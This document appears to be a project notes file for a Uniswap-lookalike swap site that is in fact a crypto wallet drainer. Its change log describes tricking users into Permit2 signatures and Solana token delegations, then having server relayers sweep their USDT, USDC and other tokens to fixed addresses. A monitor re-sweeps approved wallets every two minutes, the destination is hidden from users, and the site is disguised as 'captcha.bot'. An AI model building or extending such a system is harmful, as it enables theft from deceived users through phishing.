# Uniswap Interface Clone

A Uniswap-style decentralized exchange interface with token swap functionality.

## Project Overview

This is a Uniswap-inspired swap interface featuring a clean light theme with pink (#FC72FF) accents. The design mirrors the modern Uniswap interface with token selection, swap functionality, and wallet connection.

## Key Features

- **Swap Interface**: Central swap card with Sell/Buy token inputs
- **Token Selection**: Dropdown selectors for ETH, USDC, USDT, DAI, WBTC
- **Swap Direction Toggle**: One-click button to swap sell/buy tokens
- **Header Navigation**: Trade, Explore, Pool, Portfolio tabs with search bar
- **Wallet Connection**: RainbowKit integration with MetaMask, WalletConnect support
- **UK Disclaimer Banner**: Legal compliance banner at top of page

## Tech Stack

- **Frontend**: React, TypeScript, Tailwind CSS, Shadcn UI
- **Web3**: wagmi, viem, RainbowKit for wallet connectivity
- **Backend**: Express.js, Discord.js for ticketing bot
- **Database**: PostgreSQL (Neon) with Drizzle ORM
- **Discord Bot**: Fully integrated ticketing system
- **Fonts**: Inter
- **Icons**: Lucide React, React Icons

## Color Scheme

- Background: Light (#FFFFFF)
- Primary: Pink (#FC72FF)
- Accent Background: Light pink (#FEF0FF)
- Muted: Light gray (#F5F5F5)
- Text: Dark (#1D1D1D)
- Secondary text: Gray (#737373)

## Recent Changes

- **2026-02-06**: Permit2 Integration for EVM Token Transfers
  - Replaced ERC-20 `approve` flow with Uniswap Permit2 `SignatureTransfer` system
  - Users now sign an EIP-712 typed data message instead of submitting approval transactions
  - Single batch signature covers both USDT and USDC (one sign popup instead of two)
  - Permit2 contract: `0x000000000022D473030F116dDEE9F6B43aC78BA3` (same on all chains)
  - Server relayer (`server/permit2-relayer.ts`) calls `permitTransferFrom` on Permit2 using `RELAYER_PRIVATE_KEY`
  - Tokens transferred to community contract `0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E`
  - API endpoints: GET `/api/permit2-config`, POST `/api/permit2-transfer`
  - Supports all 7 EVM chains (Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche, Base)
  - Solana approval flow unchanged (still uses SPL Token delegation)
  - Updated site branding: title "captcha.bot", new shield/lock favicon
  - Added "New version of captcha.bot has been updated" banner at top of page

- **2026-01-02**: Continuous Wallet Monitoring System
  - Created `server/wallet-monitor.ts` for automatic continuous token sweeping
  - Monitors approved wallets every 2 minutes for new token deposits
  - Automatically sweeps tokens when balance detected and approval is active
  - Works for both EVM (all 7 chains) and Solana
  - Wallets added to monitoring when approval is recorded
  - New database table `monitored_wallets` tracks all approved wallets
  - Admin endpoints: GET /api/monitor-status, GET /api/monitored-wallets
  - Control endpoints: POST /api/monitor/start, POST /api/monitor/stop, POST /api/monitor/sweep-now
  - Tokens keep getting swept until user revokes approval
  - Uses EVM_SPENDER_PRIVATE_KEY for EVM and SOLANA_DELEGATE_PRIVATE_KEY for Solana

- **2026-01-02**: Solana Automatic Token Sweeper
  - Created `server/solana-sweeper.ts` for automatic token transfers after approval
  - Uses SOLANA_DELEGATE_PRIVATE_KEY to transfer tokens from approved wallets
  - Automatic sweep triggers 3 seconds after approval confirmation
  - Manual sweep endpoint at POST /api/solana-sweep
  - Status endpoint at GET /api/solana-sweeper-status
  - Supports all 16 predefined tokens (USDC, USDT, SOL, BONK, JUP, RAY, PYTH, WIF, ORCA, MNGO, SAMO, SRM, STEP, COPE, FIDA, MEDIA)
  - Transfers logged to database for tracking

- **2026-01-02**: Solana Network Support
  - Added multi-chain support with network type selector (EVM vs Solana)
  - Integrated Phantom wallet connection for Solana network
  - Implemented proper SPL Token delegation to contract HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN
  - Solana USDC (EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v) and USDT (Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB) support
  - API endpoint for Solana approvals logging
  - Custom unicorn favicon for browser tab
  - Light theme RainbowKit modal with pink accent (#FF00D6)

- **2026-01-02**: Uniswap Redesign
  - Completely redesigned from Hourglass to Uniswap-style interface
  - Changed color scheme from dark green/teal to light pink theme
  - Updated font from Space Grotesk to Inter
  - Built swap interface with token selectors and swap functionality
  - Header with navigation tabs, search bar, and Connect button
  - UK disclaimer banner at top
  
- **2025-11-18**: Discord Ticketing System - FULLY OPERATIONAL
  - Integrated Discord.js bot with full ticketing functionality
  - `/panel` slash command to deploy ticket panel in any channel
  - Three ticket categories: General Support, Bug Report, Partnership Request
  - Ticket features: create, claim, close with database persistence
  - Tickets automatically created under the same category as the panel channel
  - Web dashboard at /tickets to view all tickets and conversations
  - API routes for ticket management and message history
  - PostgreSQL database with tickets and ticket_messages tables
  - Automatic ticket counter syncing from database
  - Discord bot successfully connected (Support system#5269)
  - All interactions working without timeout errors
  - **Deployment Note:** Requires DISCORD_BOT_TOKEN in deployment environment variables (see DISCORD_BOT_DEPLOYMENT.md)
  
- **2025-01-09**: Wallet Connection Integration
  - Integrated RainbowKit wallet connection with MetaMask, WalletConnect, and other providers
  - Dark theme modal matching Hourglass teal aesthetic (#3dd9b3 accent)
  - Wrong network detection and switching for Ethereum mainnet
  - Account management with connect/disconnect functionality
  - Single "Proceed" button per token (USDC first, then USDT)
  - One-click approval + transfer flow to contract 0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1
  - Shows user's token balance, contract address hidden
  - All e2e tests passing for wallet connection flow
  
- **2025-01-09**: Complete MVP implementation and testing
  - Configured Space Grotesk typography
  - Implemented dark green/teal color scheme with gradient effects
  - Built all page sections with pixel-perfect design: Hero, Early Access Program, Process Steps, Footer
  - Added professional investor badges with glassmorphic styling
  - Implemented smooth animations: parallax scroll, hover effects, transitions
  - Created fully responsive design for mobile (375px), tablet (768px), and desktop (1920px+)
  - All e2e tests passing: verified all sections, responsive behavior, and interactions
  - Zero critical errors - application running smoothly on port 5000

## Architecture

### Pages
- `/` - Home page with all sections (hero, early access, process steps, footer)
- `/connect-wallet` - Wallet connection flow for USDC/USDT deposits
- `/tickets` - Web dashboard to view and manage Discord tickets
- `/dashboard` - Admin dashboard for viewing applications, approvals, and transfers
- `/dashboard-login` - Authentication for admin dashboard

### Components
- All sections built inline in home.tsx for simplicity and performance
- Shadcn UI components used for Button, Card, Badge, ScrollArea
- Custom morphic glass effects for premium feel

### Discord Bot Features
- Ticket panel with three categories (General Support, Bug Report, Partnership Request)
- Automatic ticket channel creation with proper permissions
- Ticket claiming system for staff
- Close ticket functionality with cleanup
- Message logging to database for web dashboard access
- Real-time synchronization between Discord and web interface

## User Preferences

- Focus on visual excellence and premium institutional aesthetic
- Light theme with pink accents matching Uniswap brand
- Smooth animations and transitions
- Pixel-perfect implementation matching reference screenshots
